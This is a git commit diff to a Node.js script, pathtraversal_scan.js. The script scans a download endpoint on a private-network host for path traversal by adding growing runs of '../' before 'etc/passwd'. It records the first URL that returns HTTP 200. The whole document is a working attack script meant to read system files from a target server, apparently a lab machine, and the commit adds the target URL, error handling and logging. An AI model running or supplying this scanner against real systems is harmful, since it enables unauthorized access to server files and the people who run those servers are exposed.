b70811ec8d7d7696d372756b86deaf861a8b2318
CyberSecurityHat <godofwhiteworld@gmail.com>
2023-05-04 18:32:26 +0900

    2023-05-04_CyberSecurityHat

--- pathtraversal_scan.js
+++ pathtraversal_scan.js
@@ -1,25 +1,37 @@
 const http = require('http');
 
-const url = "127.0.0.1";
+const url = "http://192.168.222.128:3000/download?file=";
 const payload = "../";
 let success_url = [];
 
 async function test() {
+
+    console.log("-------------------------------------------------------------------------------");
+
     for (let i = 0; i < 10; i++) {
-        let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
-        const response = await new Promise(resolve => {
-            http.request(victim_url, resolve).end();
-        });
-        const status = response.statusCode;
+        try {
+            let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
+            const response = await new Promise(resolve => {
+                http.request(victim_url, resolve).end();
+            });
+            const status = response.statusCode;
 
-        console.log(status);
+            console.log(status);
 
-        if (status === 200) {
-            success_url.push(victim_url);
-            break;
+            if (status === 200) {
+                success_url.push(victim_url);
+                console.log(victim_url);
+                console.log("-------------------------------------------------------------------------------");
+                break;
+            }
+            console.log(victim_url);
+            console.log("-------------------------------------------------------------------------------");
+        }   
+        catch(err) {
+            continue
         }
-    }
-    console.log(success_url);
+        }
+
 }
 
 test();
